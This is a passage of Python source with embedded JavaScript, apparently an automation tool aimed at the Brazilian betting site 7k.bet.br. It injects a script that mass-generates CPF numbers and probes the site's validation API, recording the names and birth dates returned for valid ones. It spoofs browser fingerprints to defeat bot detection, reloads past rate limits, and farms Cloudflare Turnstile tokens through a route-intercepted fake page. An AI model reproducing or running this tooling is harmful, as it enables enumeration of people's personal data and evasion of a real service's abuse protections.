                }
            } catch (error) {
                console.debug('Erro ao carregar estado de screenshots:', error);
            }
        }
        
        // Carregar estado ao inicializar
        setTimeout(loadScreenshotsEnabled, 100);
    </script>
</body>
</html>
'''


def gerar_cpf():
    """Gera um CPF brasileiro válido aleatório."""
    import random
    
    def calcular_digito(cpf_parcial, multiplicadores):
        soma = sum(int(cpf_parcial[i]) * multiplicadores[i] for i in range(len(cpf_parcial)))
        resto = soma % 11
        return '0' if resto < 2 else str(11 - resto)
    
    # Gera os 9 primeiros dígitos aleatórios
    cpf = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    
    # Calcula o primeiro dígito verificador
    multiplicadores_1 = [10, 9, 8, 7, 6, 5, 4, 3, 2]
    cpf += calcular_digito(cpf, multiplicadores_1)
    
    # Calcula o segundo dígito verificador
    multiplicadores_2 = [11, 10, 9, 8, 7, 6, 5, 4, 3, 2]
    cpf += calcular_digito(cpf, multiplicadores_2)
    
    return cpf


def injetar_js_validacao_cpf_playwright(page):
    """Injeta o JavaScript na página para gerar e validar CPFs via API."""
    # Usar add_init_script ou evaluate com função que retorna uma Promise
    # Para evitar erro de sintaxe com async, vamos usar uma abordagem diferente
    js_code = """
    (function() {
      // Verifica se já foi injetado
      if (window.cpfScriptInjetado) {
        return;
      }
      window.cpfScriptInjetado = true;
      
      function gerarCPF() {
        // gera os 9 primeiros dígitos
        let n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10));
        
        // evita CPFs com todos os dígitos iguais
        while (n.every(d => d === n[0])) {
          n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10));
        }
        
        const calcDV = (base) => {
          let soma = 0;
          for (let i = 0; i < base.length; i++) {
            soma += base[i] * ((base.length + 1) - i);
          }
          const resto = soma % 11;
          return resto < 2 ? 0 : 11 - resto;
        };
        
        const dv1 = calcDV(n);
        const dv2 = calcDV([...n, dv1]);
        
        return [...n, dv1, dv2].join("");
      }
      
      function enviarPayload(number) {
        return fetch("https://7k.bet.br/api/documents/validate", {
          method: "POST",
          credentials: "include",
          headers: {
            "accept": "application/json",
            "content-type": "application/json"
          },
          body: JSON.stringify({
            number,
            captcha_token: ""
          })
        }).then(response => {
          // Verifica se recebeu erro 429 (Too Many Requests)
          if (response.status === 429) {
            console.log("⚠️  Erro 429 detectado! Recarregando página...");
            localStorage.removeItem("cpf_script_ativo");
            window.location.reload();
            return null;
          }
          return response.json();
        });
      }
      
      // Expõe as funções globalmente
      window.gerarCPF = gerarCPF;
      window.enviarPayload = enviarPayload;
      
      // Função para iniciar o loop de validação (usando Promise ao invés de async)
      function iniciarLoop() {
        // Limpa intervalos anteriores se existirem
        if (window.cpfIntervals) {
          window.cpfIntervals.forEach(interval => clearInterval(interval));
        }
        window.cpfIntervals = [];
        
        // Função recursiva para processar lotes
        function processarLote() {
          try {
            // Gera 5 CPFs
            const cpfs = [];
            for (let i = 0; i < 5; i++) {
              cpfs.push(gerarCPF());
            }
            
            console.log(`📦 Enviando lote de 5 CPFs: ${cpfs.join(", ")}`);
            
            // Envia todas as 5 requisições em paralelo
            const promessas = cpfs.map(cpf => enviarPayload(cpf));
            
            // Aguarda todas as respostas
            Promise.all(promessas).then(resultados => {
              // Verifica se alguma requisição retornou null (429 - reload)
              const tem429 = resultados.some(res => res === null);
              
              if (tem429) {
                console.log("⚠️  Erro 429 detectado no lote! Recarregando página...");
                localStorage.removeItem("cpf_script_ativo");
                window.location.reload();
                return;
              }
              
              // Se não teve 429, mostra os resultados formatados
              resultados.forEach((res, index) => {
                if (res !== null) {
                  const cpf = cpfs[index];
                  // Formata o resultado para exibição clara
                  const resultadoFormatado = JSON.stringify(res);
                  console.log(`✅ CPF ${cpf}: ${resultadoFormatado}`);
                  
                  // Se o resultado indica sucesso (CPF válido), destaca e envia informações completas
                  // Verifica se é válido de várias formas possíveis
                  const isValid = res.valid === true || 
                                 res.success === true || 
                                 res.isValid === true ||
                                 (res.message && (res.message.toLowerCase().includes('válido') || res.message.toLowerCase().includes('valido'))) ||
                                 (res.status && res.status === 'valid') ||
                                 (res.data && res.data.valid === true);
                  
                  if (isValid) {
                    // Extrai nome e data de nascimento se disponíveis (tenta vários campos possíveis)
                    const nome = res.name || res.nome || res.fullName || res.full_name || 
                                (res.data && (res.data.name || res.data.nome)) || null;
                    const dataNasc = res.birthDate || res.birth_date || res.dataNascimento || res.data_nascimento ||
                                    res.birthdate || res.birth_date ||
                                    (res.data && (res.data.birthDate || res.data.birth_date || res.data.dataNascimento)) || null;
                    
                    // Envia informações completas no formato especial para o Python detectar
                    console.log(`🎉 CPF_VALIDO_DETECTADO:CPF=${cpf}|NOME=${nome || 'N/A'}|DATA_NASC=${dataNasc || 'N/A'}|RESULTADO=${resultadoFormatado}`);
                  }
                }
              });
              
              // Continua processando após um pequeno delay
              setTimeout(processarLote, 1000);
            }).catch(error => {
              console.error("Erro ao processar lote:", error);
              localStorage.removeItem("cpf_script_ativo");
              window.location.reload();
            });
          } catch (error) {
            console.error("Erro ao processar lote:", error);
            localStorage.removeItem("cpf_script_ativo");
            window.location.reload();
          }
        }
        
        // Inicia o processamento
        processarLote();
      }
      
      // Inicia o loop
      iniciarLoop();
      
      // Marca que o script foi injetado (para o Python verificar)
      localStorage.setItem("cpf_script_ativo", "true");
    })();
    """
    
    try:
        # Verificar se a página ainda está aberta antes de injetar
        try:
            _ = page.url
        except:
            return False
        
        page.evaluate(js_code)
        return True
    except Exception as e:
        error_msg = str(e)
        # Não logar erro se a página foi fechada (é esperado em alguns casos)
        if "Target page" not in error_msg and "has been closed" not in error_msg and "has bee" not in error_msg:
            print(f"[Worker] ⚠️  Erro ao injetar JavaScript: {e}")
        return False


def run_single_worker_7k(worker_id: int, ws_endpoint: str,
                          proxy_server: str, proxy_username: str, proxy_password: str,
                          use_proxy: bool):
    """
    Executa um único worker no modo 7k - similar ao exemplo JavaScript fornecido.
    
    Bibliotecas utilizadas:
    - Playwright (playwright.sync_api): Para automação do navegador via WebSocket/CDP
      - Conecta ao servidor Browserless usando connect_over_cdp()
      - Cria contexto do navegador com proxy configurável
      - Navega para o site 7k.bet.br
      - Injeta JavaScript na página para validação de CPF
      - Monitora reloads e reinjeta o JavaScript automaticamente
    
    Funcionalidades:
    - Conecta ao Browserless via WebSocket (CDP - Chrome DevTools Protocol)
    - Configura proxy residencial BR (se habilitado)
    - Navega para https://7k.bet.br
    - Injeta JavaScript que valida CPFs em lotes de 5 via API
    - Monitora reloads da página e reinjeta o JavaScript quando necessário
    - Loop infinito até clicar no botão "Parar"
    - Logs são salvos em dashboard_7k_logs.txt
    
    Parâmetros:
    - worker_id: ID único do worker
    - ws_endpoint: Endpoint WebSocket do servidor Browserless
    - proxy_server: Servidor proxy (ex: http://host:porta)
    - proxy_username: Username do proxy
    - proxy_password: Password do proxy
    - use_proxy: Se True, usa proxy; se False, não usa proxy
    """
    sys.excepthook = suppress_playwright_errors
    
    result = {
        "worker_id": worker_id,
        "success": False,
        "ip": None,
        "location": None,
        "title": "7k.bet.br - Validação CPF",
        "error": None,
        "details": "",
        "duration": 0,
        "proxy_used": use_proxy,
        "response_content": None,
        "response_preview": None,
        "status_code": None,
        "url": "https://7k.bet.br"
    }
    
    start = time.time()
    browser = None
    context = None
    page = None
    
    try:
        log_print(f"[Worker {worker_id}] Starting...")
        
        with sync_playwright() as p:
            # Conectar via CDP (similar ao connectOverCDP do exemplo)
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                browser = p.chromium.connect_over_cdp(ws_endpoint, timeout=10000)
            
            # User agent realista (sem HeadlessChrome para evitar detecção)
            user_agent_realista = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            
            # Criar contexto com proxy (se habilitado)
            if use_proxy:
                context = browser.new_context(
                    proxy={
                        "server": proxy_server,
                        "username": proxy_username,
                        "password": proxy_password
                    },
                    ignore_https_errors=True,
                    user_agent=user_agent_realista,
                    viewport={"width": 1366, "height": 768}
                )
            else:
                context = browser.new_context(
                    ignore_https_errors=True,
                    user_agent=user_agent_realista,
                    viewport={"width": 1366, "height": 768}
                )
            
            # Criar nova página
            page = context.new_page()
            
            # Função auxiliar para adicionar listener de console
            def adicionar_console_listener(pagina):
                """Adiciona listener de console à página."""
                def handle_console(msg):
                    """Captura mensagens do console JavaScript e exibe nos logs do Python."""
                    try:
                        text = msg.text
                        msg_type = msg.type
                        
                        # Verificar se é um CPF válido detectado
                        if "🎉 CPF_VALIDO_DETECTADO:" in text:
                            # Extrair informações do CPF válido
                            try:
                                # Formato: 🎉 CPF_VALIDO_DETECTADO:CPF=xxx|NOME=xxx|DATA_NASC=xxx|RESULTADO=xxx
                                partes = text.split("CPF_VALIDO_DETECTADO:")[1]
                                dados = {}
                                for parte in partes.split("|"):
                                    if "=" in parte:
                                        chave, valor = parte.split("=", 1)
                                        dados[chave] = valor
                                
                                cpf = dados.get("CPF", "")
                                nome = dados.get("NOME", "N/A")
                                data_nasc = dados.get("DATA_NASC", "N/A")
                                
                                # Salvar CPF válido no arquivo separado
                                if cpf:
                                    salvar_cpf_valido(cpf, nome if nome != "N/A" else None, 
                                                     data_nasc if data_nasc != "N/A" else None, 
                                                     worker_id)
                                
                                # Log normal também
                                log_print(f"[Worker {worker_id}] 🎉 CPF VÁLIDO ENCONTRADO: {cpf} | Nome: {nome} | Data Nasc: {data_nasc}")
                            except Exception as e:
                                log_print(f"[Worker {worker_id}] Erro ao processar CPF válido: {e}")
                                # Log normal mesmo se falhar o parsing
                                log_print(f"[Worker {worker_id}] JS: {text}")
                        else:
                            # Formatar mensagem baseado no tipo
                            if msg_type == "log":
                                log_print(f"[Worker {worker_id}] JS: {text}")
                            elif msg_type == "error":
                                log_print(f"[Worker {worker_id}] JS ERROR: {text}")
                            elif msg_type == "warning":
                                log_print(f"[Worker {worker_id}] JS WARNING: {text}")
                            else:
                                log_print(f"[Worker {worker_id}] JS [{msg_type}]: {text}")
                    except:
                        pass
                pagina.on("console", handle_console)
            
            # Função auxiliar para verificar e recriar contexto se necessário
            def verificar_ou_recriar_contexto(log_erro=True):
                """Verifica se o contexto está válido, se não estiver, recria."""
                nonlocal context, page
                try:
                    # Tenta acessar uma propriedade do contexto para verificar se está válido
                    _ = context.pages
                    return True  # Contexto está válido
                except:
                    # Contexto foi fechado, precisa recriar
                    try:
                        if log_erro:
                            log_print(f"[Worker {worker_id}] Contexto foi fechado, recriando contexto...")
                        # Fechar contexto antigo se ainda existir
                        try:
                            context.close()
                        except:
                            pass
                        
                        # Recriar contexto
                        # User agent realista (sem HeadlessChrome para evitar detecção)
                        user_agent_realista = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                        
                        if use_proxy:
                            context = browser.new_context(
                                proxy={
                                    "server": proxy_server,
                                    "username": proxy_username,
                                    "password": proxy_password
                                },
                                ignore_https_errors=True,
                                user_agent=user_agent_realista,
                                viewport={"width": 1366, "height": 768}
                            )
                        else:
                            context = browser.new_context(
                                ignore_https_errors=True,
                                user_agent=user_agent_realista,
                                viewport={"width": 1366, "height": 768}
                            )
                        
                        if log_erro:
                            log_print(f"[Worker {worker_id}] Contexto recriado com sucesso!")
                        return True
                    except Exception as ctx_error:
                        if log_erro:
                            log_print(f"[Worker {worker_id}] Erro ao recriar contexto: {str(ctx_error)[:100]}")
                        return False
            
            # Função auxiliar para criar nova página (com verificação de contexto)
            def criar_nova_pagina(log_erro=True):
                """Cria uma nova página, recriando o contexto se necessário."""
                nonlocal page
                # Verificar se o contexto está válido
                if not verificar_ou_recriar_contexto(log_erro=log_erro):
                    return False
                
                try:
                    page = context.new_page()
                    adicionar_console_listener(page)
                    
                    # Sobrescrever user agent via JavaScript para evitar detecção de HeadlessChrome
                    user_agent_js = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                    try:
                        page.add_init_script(f"""
                            Object.defineProperty(navigator, 'userAgent', {{
                                get: () => '{user_agent_js}'
                            }});
                            Object.defineProperty(navigator, 'webdriver', {{
                                get: () => undefined
                            }});
                            window.chrome = {{
                                runtime: {{}}
                            }};
                        """)
                    except:
                        pass
                    
                    page.goto("https://7k.bet.br", timeout=60000, wait_until="domcontentloaded")
                    time.sleep(2)
                    injetar_js_validacao_cpf_playwright(page)
                    return True
                except Exception as page_error:
                    error_msg = str(page_error)
                    if log_erro:
                        log_print(f"[Worker {worker_id}] Erro ao criar página: {error_msg[:100]}")
                    return False
            
            # Adicionar listener à página inicial
            adicionar_console_listener(page)
            
            # Sobrescrever user agent via JavaScript para evitar detecção de HeadlessChrome
            user_agent_js = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            try:
                page.add_init_script(f"""
                    Object.defineProperty(navigator, 'userAgent', {{
                        get: () => '{user_agent_js}'
                    }});
                    Object.defineProperty(navigator, 'webdriver', {{
                        get: () => undefined
                    }});
                    window.chrome = {{
                        runtime: {{}}
                    }};
                """)
            except:
                pass
            
            # Navegar para o site 7k.bet.br
            log_print(f"[Worker {worker_id}] Navegando para https://7k.bet.br...")
            try:
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    page.goto("https://7k.bet.br", timeout=60000, wait_until="domcontentloaded")
                    # Aguardar página carregar completamente usando estado válido
                    try:
                        page.wait_for_load_state("load", timeout=30000)
                    except:
                        # Se load falhar, tenta domcontentloaded
                        try:
                            page.wait_for_load_state("domcontentloaded", timeout=30000)
                        except:
                            pass
                time.sleep(2)
                log_print(f"[Worker {worker_id}] Página carregada!")
            except Exception as nav_error:
                error_msg = str(nav_error)
                if "Target page" in error_msg or "has been closed" in error_msg or "has bee" in error_msg:
                    result["error"] = "Página/contexto/browser foi fechado durante navegação"
                    result["details"] = "Erro ao navegar: página foi fechada antes de completar"
                    log_print(f"[Worker {worker_id}] Erro de navegação: {error_msg}")
                    return result
                else:
                    raise
            
            # Injeta o JavaScript de validação de CPF
            log_print(f"[Worker {worker_id}] Injetando JavaScript de validação de CPF...")
            try:
                injetar_js_validacao_cpf_playwright(page)
                log_print(f"[Worker {worker_id}] JavaScript injetado com sucesso!")
            except Exception as js_error:
                log_print(f"[Worker {worker_id}] Erro ao injetar JavaScript: {js_error}")
                # Continua mesmo se falhar a injeção inicial
            
            # Monitora reloads e reinjeta o JavaScript quando necessário
            # Loop infinito até clicar em "Parar"
            global workers_should_stop
            
            # Resetar flag de stop quando worker inicia
            with workers_stop_lock:
                if workers_should_stop:
                    workers_should_stop = False
            
            while True:
                # Verificar se deve parar
                with workers_stop_lock:
                    if workers_should_stop:
                        log_print(f"[Worker {worker_id}] Parando por solicitação do usuário...")
                        # Fechar browser imediatamente quando parar
                        try:
                            if page:
                                try:
                                    page.close()
                                except:
                                    pass
                        except:
                            pass
                        try:
                            if context:
                                try:
                                    context.close()
                                except:
                                    pass
                        except:
                            pass
                        try:
                            if browser:
                                try:
                                    browser.close()
                                    log_print(f"[Worker {worker_id}] Browser fechado por solicitação do usuário")
                                except:
                                    pass
                        except:
                            pass
                        break
                
                try:
                    time.sleep(2)
                    
                    # Verifica se a página ainda está aberta antes de usar
                    try:
                        # Verificar se a página ainda está válida antes de tentar usar
                        try:
                            _ = page.url
                        except:
                            # Página foi fechada, precisa recriar
                            raise Exception("Target page has been closed")
                        
                        # Tenta verificar se o script ainda está ativo
                        script_ativo = page.evaluate(
                            "localStorage.getItem('cpf_script_ativo') === 'true'"
                        )
                        
                        # Se o script não está ativo, significa que a página recarregou
                        if not script_ativo:
                            log_print(f"[Worker {worker_id}] Detectado reload da página. Reinjetando JavaScript...")
                            try:
                                # Aguarda carregamento usando estado válido
                                try:
                                    page.wait_for_load_state("load", timeout=30000)
                                except:
                                    try:
                                        page.wait_for_load_state("domcontentloaded", timeout=30000)
                                    except:
                                        pass
                                time.sleep(1)
                                if injetar_js_validacao_cpf_playwright(page):
                                    log_print(f"[Worker {worker_id}] JavaScript reinjetado!")
                                else:
                                    log_print(f"[Worker {worker_id}] Falha ao reinjetar, tentando novamente na próxima iteração...")
                            except Exception as reinject_error:
                                error_msg = str(reinject_error)
                                if "Target page" in error_msg or "has been closed" in error_msg or "has bee" in error_msg:
                                    # Página foi fechada, mas não quebra o loop - continua tentando
                                    log_print(f"[Worker {worker_id}] Página foi fechada durante reinjeção, aguardando 10s antes de recriar...")
                                    time.sleep(10)  # Aguarda mais tempo antes de recriar
                                    # Tenta recriar a página se necessário
                                    if criar_nova_pagina():
                                        if should_log:
                                            log_print(f"[Worker {worker_id}] Página recriada e JavaScript reinjetado!")
                                    else:
                                        time.sleep(10)  # Aguarda antes de tentar novamente
                                else:
                                    log_print(f"[Worker {worker_id}] Erro ao reinjetar: {reinject_error}, continuando...")
                    except Exception as check_error:
                        error_msg = str(check_error)
                        if "Target page" in error_msg or "has been closed" in error_msg or "has bee" in error_msg:
                            # Página foi fechada, mas continua o loop
                            # Reduzir spam de logs - só logar a cada 30 segundos
                            current_time = time.time()
                            should_log = False
                            with worker_error_log_lock:
                                last_log = worker_error_log_times.get(worker_id, 0)
                                should_log = current_time - last_log > 30  # Só loga a cada 30 segundos
                                if should_log:
                                    log_print(f"[Worker {worker_id}] Erro ao verificar script (página fechada), tentando recriar página...")
                                    worker_error_log_times[worker_id] = current_time
                            
                            time.sleep(5)  # Aguarda antes de tentar recriar
                            
                            # Tenta recriar página (a função já verifica e recria o contexto se necessário)
                            if criar_nova_pagina():
                                if should_log:  # Só loga sucesso se logou o erro
                                    log_print(f"[Worker {worker_id}] Página recriada com sucesso!")
                            else:
                                time.sleep(10)  # Aguarda mais tempo antes de tentar novamente
                        else:
                            # Se der outro erro, tenta reinjetar como precaução (sem logar para evitar spam)
                            try:
                                time.sleep(2)
                                try:
                                    page.wait_for_load_state("load", timeout=30000)
                                except:
                                    try:
                                        page.wait_for_load_state("domcontentloaded", timeout=30000)
                                    except:
                                        pass
                                time.sleep(1)
                                injetar_js_validacao_cpf_playwright(page)
                            except:
                                pass
                except Exception as e:
                    # Se der erro geral, continua o loop (não quebra)
                    error_msg = str(e)
                    if "Target page" in error_msg or "has been closed" in error_msg or "has bee" in error_msg:
                        # Reduzir spam de logs
                        current_time = time.time()
                        should_log_error = False
                        with worker_error_log_lock:
                            last_log = worker_error_log_times.get(worker_id, 0)
                            should_log_error = current_time - last_log > 30
                            if should_log_error:
                                log_print(f"[Worker {worker_id}] Erro detectado, aguardando e continuando...")
                                worker_error_log_times[worker_id] = current_time
                        
                        time.sleep(5)
                        # Tenta recriar página (a função já verifica e recria o contexto se necessário)
                        criar_nova_pagina(log_erro=should_log_error)
                    continue
            
            # Worker completou com sucesso
            result["success"] = True
            result["details"] = f"✅ Worker {worker_id} executado com sucesso - Validação de CPF em execução"
            log_print(f"[Worker {worker_id}] Completed successfully")
            
    except Exception as error:
        error_msg = str(error)
        # Tratar erros específicos
        if "Target page" in error_msg or "has been closed" in error_msg or "has bee" in error_msg:
            result["error"] = "Página/contexto/browser foi fechado"
            result["details"] = "Recurso foi fechado durante execução"
        elif "state: expected one of" in error_msg:
            result["error"] = "Erro no estado de carregamento da página"
            result["details"] = "Estado inválido ao aguardar carregamento"
        else:
            result["error"] = error_msg[:100]
            result["details"] = f"Erro: {error_msg[:50]}"
        log_print(f"[Worker {worker_id}] Error: {error_msg}")
    
    finally:
        # Fechar recursos (similar ao browser.close() do exemplo)
        # Verificar se ainda estão abertos antes de fechar
        try:
            if page:
                try:
                    # Verifica se a página ainda está aberta tentando acessar uma propriedade
                    _ = page.url
                    page.close()
                except:
                    pass  # Página já foi fechada ou não está mais disponível
        except:
            pass
        
        try:
            if context:
                try:
                    context.close()
                except:
                    pass  # Contexto já foi fechado
        except:
            pass
        
        try:
            if browser:
                try:
                    browser.close()
                except:
                    pass  # Browser já foi fechado
        except:
            pass
    
    result["duration"] = round(time.time() - start, 2)
    sys.excepthook = original_excepthook
    
    return result


def load_turnstile_sitekey() -> str:
    """Carrega a sitekey do Turnstile do arquivo."""
    try:
        with open(TURNSTILE_SITEKEY_FILE, 'r') as f:
            return json.load(f).get("sitekey", "0x4AAAAAAAykd8yJm3kQzNJc")
    except:
        return "0x4AAAAAAAykd8yJm3kQzNJc"


def save_turnstile_token(token: str, tab_id: int, processing_time: float, sitekey: str, solve_count: int):
    """Salva token do Turnstile com lock para thread-safety"""
    entry = {
        "token": token,
        "url": "https://7k.bet.br",
        "sitekey": sitekey,
        "tab_id": tab_id,
        "solve_number": solve_count,
        "timestamp": datetime.now().isoformat(),
        "expires_in": 300,
        "processing_time_seconds": round(processing_time, 2),
        "valid": True
    }
    
    with turnstile_token_lock:
        tokens = []
        if os.path.exists(TURNSTILE_TOKEN_FILE):
            try:
                with open(TURNSTILE_TOKEN_FILE, 'r') as f:
                    data = json.load(f)
                    tokens = data if isinstance(data, list) else [data]
            except:
                pass
        
        tokens.append(entry)
        
        with open(TURNSTILE_TOKEN_FILE, 'w') as f:
            json.dump(tokens, f, indent=2, ensure_ascii=False)
    
    log_print(f"[Captcha] ✅ Token salvo para tab {tab_id} (#{solve_count})")


def run_single_worker_captcha(worker_id: int, ws_endpoint: str,
                               proxy_server: str, proxy_username: str, proxy_password: str,
                               use_proxy: bool, results_queue: list = None):
    """
    Worker para resolver Turnstile/Captcha continuamente.
    Mantém a aba aberta e recarrega após cada resolução ou timeout.
    
    Baseado no script turnstile_persistent_solver.py:
    - Usa URL real https://7k.bet.br/ que é interceptada via page.route()
    - Conecta ao Browserless via CDP (ao invés de lançar browser local)
    - Clica no checkbox e aguarda resolução
    - Salva tokens no arquivo turnstile_token.json
    - Loop infinito até clicar no botão "Parar"
    """
    global captcha_should_stop, captcha_stats
    sys.excepthook = suppress_playwright_errors
    
    result = {
        "worker_id": worker_id,
        "success": False,
        "ip": None,
        "location": None,
        "title": "Turnstile Solver",
        "error": None,
        "details": "",
        "duration": 0,
        "proxy_used": use_proxy,
        "captcha_solved": 0
    }
    
    start = time.time()
    browser = None
    context = None
    page = None
    solve_count = 0
    sitekey = load_turnstile_sitekey()
    
    # URL real que será interceptada (exatamente como no script original)
    url = "https://7k.bet.br/"
    
    # HTML da página com Turnstile - usando API explícita com callback
    # E adicionando meta tags para parecer mais legítimo
    PAGE_HTML = f'''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>7k.bet.br - Tab {worker_id}</title>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async defer></script>
<style>
body {{ background: #0f0f1a; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: system-ui; }}
.box {{ background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 25px 35px; border-radius: 16px; text-align: center; color: #fff; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }}
h2 {{ margin: 0 0 5px; color: #4ade80; font-size: 28px; }}
.status {{ font-size: 14px; color: #888; margin-bottom: 15px; }}
#turnstile-container {{ min-height: 65px; }}
</style>
</head><body>
<div class="box">
<h2>Tab #{worker_id}</h2>
<div class="status" id="status">Carregando Turnstile...</div>
<div id="turnstile-container"></div>
<input type="hidden" id="cf-token" value="">
</div>
<script>
// Callback quando Turnstile for carregado
function onTurnstileLoad() {{
    document.getElementById('status').textContent = 'Renderizando widget...';
    try {{
        turnstile.render('#turnstile-container', {{
            sitekey: '{sitekey}',
            callback: function(token) {{
                document.getElementById('cf-token').value = token;
                document.getElementById('status').textContent = 'Token obtido!';
                console.log('TURNSTILE_TOKEN_READY:' + token.substring(0, 30));
            }},
            'error-callback': function(error) {{
                document.getElementById('status').textContent = 'Erro: ' + error;
                console.error('TURNSTILE_ERROR:' + error);
            }},
            'expired-callback': function() {{
                document.getElementById('status').textContent = 'Token expirado, recarregando...';
                document.getElementById('cf-token').value = '';
            }},
            theme: 'dark',
            size: 'normal'
        }});
    }} catch(e) {{
        document.getElementById('status').textContent = 'Erro ao renderizar: ' + e.message;
        console.error('TURNSTILE_RENDER_ERROR:' + e.message);
    }}
}}

// Verificar se Turnstile já carregou ou aguardar
if (typeof turnstile !== 'undefined') {{
    onTurnstileLoad();
}} else {{
    // Aguardar o script carregar
    var checkInterval = setInterval(function() {{
        if (typeof turnstile !== 'undefined') {{
            clearInterval(checkInterval);
            onTurnstileLoad();
        }}
    }}, 100);
    
    // Timeout de 10 segundos
    setTimeout(function() {{
        clearInterval(checkInterval);
        if (typeof turnstile === 'undefined') {{
            document.getElementById('status').textContent = 'Turnstile não carregou';
            console.error('TURNSTILE_LOAD_TIMEOUT');
        }}
    }}, 10000);
}}
</script>
</body></html>'''
    
    try:
        log_print(f"[Tab {worker_id}] Iniciando browser...")
        
        with sync_playwright() as p:
            # Conectar ao Browserless via CDP
            with warnings.catch_warnings():
                warnings.simplefilter("ignore")
                browser = p.chromium.connect_over_cdp(ws_endpoint, timeout=60000)
            
            # Pega user agent real do browser (como no script original)
            temp_page = browser.new_page()
            real_user_agent = temp_page.evaluate("navigator.userAgent")
            temp_page.close()
            
            log_print(f"[Tab {worker_id}] User-Agent: {real_user_agent[:70]}...")
            
            # Configurações do contexto com opções anti-detecção
            context_opts = {
                "viewport": {"width": 400, "height": 400},
                "user_agent": real_user_agent,
                "ignore_https_errors": True,
                "java_script_enabled": True,
                "has_touch": False,
                "is_mobile": False,
                "locale": "pt-BR",
                "timezone_id": "America/Sao_Paulo",
                "device_scale_factor": 1,
                "color_scheme": "dark"
            }
            
            # Adiciona proxy se habilitado
            if use_proxy:
                context_opts["proxy"] = {
                    "server": proxy_server,
                    "username": proxy_username,
                    "password": proxy_password
                }
            
            log_print(f"[Tab {worker_id}] Criando contexto...")
            context = browser.new_context(**context_opts)
            log_print(f"[Tab {worker_id}] Contexto criado! Criando página...")
            page = context.new_page()
            log_print(f"[Tab {worker_id}] Página criada!")
            
            # Variável para armazenar token detectado via console
            detected_token = {"value": None}
            
            # Adicionar listener de console para debug e capturar token
            def on_console(msg):
                text = msg.text
                # Capturar token do callback do Turnstile
                if "TURNSTILE_TOKEN_READY:" in text:
                    log_print(f"[Tab {worker_id}] 🎉 Token detectado via callback!")
                    detected_token["value"] = "ready"
                elif "TURNSTILE_ERROR:" in text:
                    log_print(f"[Tab {worker_id}] ❌ Turnstile Error: {text}")
                elif "TURNSTILE_LOAD_TIMEOUT" in text:
                    log_print(f"[Tab {worker_id}] ⏰ Turnstile não carregou em 10s")
                elif "TURNSTILE_RENDER_ERROR:" in text:
                    log_print(f"[Tab {worker_id}] ❌ Erro ao renderizar: {text}")
                elif msg.type in ["error", "warning"]:
                    # Filtrar mensagens irrelevantes
                    if "font-size:0" not in text and "WebGPU" not in text:
                        log_print(f"[Tab {worker_id}] 🌐 Console {msg.type}: {text[:100]}")
            
            page.on("console", on_console)
            
            # Listener para erros de página
            def on_page_error(error):
                log_print(f"[Tab {worker_id}] ❌ Page Error: {str(error)[:100]}")
            
            page.on("pageerror", on_page_error)
            
            # Intercepta requisições para servir nossa página (exatamente como no script original)
            # Usa url + "**" para interceptar qualquer caminho dentro do domínio
            log_print(f"[Tab {worker_id}] Configurando route para interceptar {url}...")
            
            def route_handler(route):
                log_print(f"[Tab {worker_id}] 🔀 Route interceptou: {route.request.url}")
                route.fulfill(
                    body=PAGE_HTML,
                    status=200,
                    content_type="text/html"
                )
            
            page.route(url + "**", route_handler)
            log_print(f"[Tab {worker_id}] Route configurado!")
            
            # Primeira navegação (como no script original)
            log_print(f"[Tab {worker_id}] Navegando para {url}...")
            page.goto(url)
            log_print(f"[Tab {worker_id}] ✅ Página carregada!")
            
            # Aguardar o script do Turnstile carregar e criar o iframe
            log_print(f"[Tab {worker_id}] ⏳ Aguardando iframe do Turnstile aparecer (max 15s)...")
            iframe_found = False
            for wait_attempt in range(15):  # Tenta por 15 segundos
                time.sleep(1)
                iframe = page.query_selector("iframe")
                if iframe:
                    log_print(f"[Tab {worker_id}] ✅ Iframe encontrado após {wait_attempt + 1}s!")
                    iframe_found = True
                    break
                else:
                    if wait_attempt % 3 == 0:
                        log_print(f"[Tab {worker_id}] ⏳ Ainda aguardando iframe... ({wait_attempt + 1}s)")
            
            if not iframe_found:
                log_print(f"[Tab {worker_id}] ⚠️ Iframe NÃO apareceu após 15s!")
                # Verificar o HTML para debug
                html_content = page.content()
                log_print(f"[Tab {worker_id}] HTML atual: {html_content[:800]}...")
                
                # Verificar se há scripts carregados
                scripts = page.query_selector_all("script")
                log_print(f"[Tab {worker_id}] Total de scripts na página: {len(scripts)}")
                
                # Tentar verificar se o Turnstile está tentando carregar
                try:
                    turnstile_widget = page.query_selector(".cf-turnstile")
                    if turnstile_widget:
                        inner_html = turnstile_widget.inner_html()
                        log_print(f"[Tab {worker_id}] Widget Turnstile innerHTML: {inner_html[:200]}...")
                except Exception as e:
                    log_print(f"[Tab {worker_id}] Erro ao verificar widget: {str(e)[:50]}")
            
            log_print(f"[Tab {worker_id}] 🚀 Iniciando loop de resolução...")
            attempt_number = 0
            
            # Loop infinito até stop_flag (como no script original)
            while True:
                attempt_number += 1
                log_print(f"[Tab {worker_id}] === TENTATIVA #{attempt_number} ===")
                
                # Verificar se deve parar
                with captcha_stop_lock:
                    if captcha_should_stop:
                        log_print(f"[Tab {worker_id}] Parando captcha por solicitação...")
                        break
                
                with workers_stop_lock:
                    if workers_should_stop:
                        log_print(f"[Tab {worker_id}] Parando captcha (flag global)...")
                        break
                
                attempt_start = time.time()
                click_count = 0
                resolved = False
                max_time = 60  # Timeout por tentativa
